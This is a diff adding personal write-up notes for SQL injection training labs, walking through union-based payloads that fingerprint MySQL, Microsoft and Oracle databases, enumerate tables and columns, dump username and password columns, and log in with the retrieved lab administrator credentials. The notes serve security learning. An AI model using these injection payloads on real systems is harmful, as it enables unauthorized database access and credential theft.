@@ -29,6 +29,9 @@
 
 ---
 
+<img width="646" height="578" alt="image" src="https://github.com/user-attachments/assets/62b0dfe3-bb9c-4f3e-a57f-9e2178e82202" />
+
+
 //LAB -- SQL injection attack, querying the database type and version on Oracle
 
 <img width="1127" height="339" alt="image" src="https://github.com/user-attachments/assets/93d4f8d0-7339-490f-88e8-b504e5ed097b" />
@@ -51,6 +54,28 @@
 - `GET /filter?category='union+select+banner,version+from+v$version--+- HTTP/2` -- this did it
 
 <img width="1127" height="505" alt="image" src="https://github.com/user-attachments/assets/b89c7366-d428-4505-b583-41b326ea115a" />
+
+---
+
+//LAB -- SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+
+- first add `'` -- returns 500 error
+- then add `-- -` -- and it turns back to 200 OK -- so we can control this param
+- next try `' union select null, null-- -` -- returns 200 OK
+
+<img width="1120" height="325" alt="image" src="https://github.com/user-attachments/assets/4800d88a-b25f-4d2f-ae15-1f0e8252c947" />
+
+- adding another `null` and we get 500 error -- so there's 2 params
+
+<img width="1122" height="293" alt="image" src="https://github.com/user-attachments/assets/65b68a28-6c6b-4b68-9376-a8410a188d8b" />
+
+- try adding `@@version` in the second param and it works -- lab solved
+
+<img width="1126" height="464" alt="image" src="https://github.com/user-attachments/assets/03a6bcdf-6078-4f21-86eb-795cbcb2d9a4" />
+
+
+
 
 ---
 
@@ -158,18 +183,78 @@
 ---
 
 
+<img width="636" height="556" alt="image" src="https://github.com/user-attachments/assets/c0ef5c21-e703-433c-a4c3-752c4592fae6" />
+
+//LAB: SQL injection attack, listing the database contents on non-Oracle databases
+
+- again we start with `'` to check for 500 error -- and we got it
+- add `-- -` -- and we get 200OK back -- so we can control this param
+- try `'union select null,null` -- got 200 OK
+- add another `null` and got 500 error -- so 2 params
+
+- now find out table names with `'union select null,table_name from information_schema.tables-- -`
+
+<img width="1121" height="341" alt="image" src="https://github.com/user-attachments/assets/5fd50f88-9fa3-436d-aaaa-4f44033b3ccc" />
+
+- then find out column names with `'union select null,column_name from information_schema.columns WHERE table_name='users_zadosk'-- -'`
+
+<img width="1125" height="392" alt="image" src="https://github.com/user-attachments/assets/78761de9-74a5-43f4-a710-c1f1b548f8cc" />
+
+- now then grab values from username and password columns
+- with `'union select username_axdwup,password_zgnvmz from users_zadosk-- -`
+
+<img width="1119" height="364" alt="image" src="https://github.com/user-attachments/assets/cd711c05-aa43-4097-817e-f13d1b1973a8" />
+
+- log in with the creds `administrator : jitveencs2xg29b45bcp`
+- and lab solved
+
+<img width="938" height="337" alt="image" src="https://github.com/user-attachments/assets/afd19970-d7c1-4e15-860f-f2a1c2463675" />
 
 
 
+---
+
+<img width="634" height="186" alt="image" src="https://github.com/user-attachments/assets/31131a40-bd9c-466d-87a1-e05b01e58d86" />
 
 
+//LAB: SQL injection attack, listing the database contents on Oracle
 
 
+- again we first begin with `'` -- and got 500 error
+- add `-- -` -- and we got 200 OK back -- so we can control this param
+- find out how many columns there are with `'union select null,null from dual-- -` -- and got 200 OK
+
+<img width="1122" height="312" alt="image" src="https://github.com/user-attachments/assets/d78b51ce-eb12-4aa2-a33f-a5a5cadb389d" />
 
 
+- add another `null` and we got 500 error
+- NOTE that for ORACLE syntax we have to include `from dual`
+
+<img width="1125" height="307" alt="image" src="https://github.com/user-attachments/assets/558812dc-b3f2-48df-b6e5-28bc453757db" />
 
 
+- now look up ORACLE syntax `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md#oracle-sql-methodology`
+- find out table_name with `'union select table_name,null from all_tables-- -`
 
+<img width="1121" height="331" alt="image" src="https://github.com/user-attachments/assets/76781e74-6b99-4a81-b9d5-e94f5dcc2dee" />
+
+
+- now find out columns with `'union select column_name,null from all_tab_columns where table_name='USERS_PSGOIQ'`
+
+<img width="1120" height="466" alt="image" src="https://github.com/user-attachments/assets/20d07fc4-bd82-4642-8d88-96e4e3406601" />
+
+
+- finally we grab username and password values from the table
+
+<img width="1125" height="350" alt="image" src="https://github.com/user-attachments/assets/08e058e1-f0e7-44fa-b58d-67ed9ef9100d" />
+
+
+- log in with `administrator : mwx5jp3c7m52y832wx6v`
+- and lab solved
+
+<img width="925" height="341" alt="image" src="https://github.com/user-attachments/assets/07dcf036-f595-4831-baa4-cc0f9e137c63" />
+
+---
 
 
 
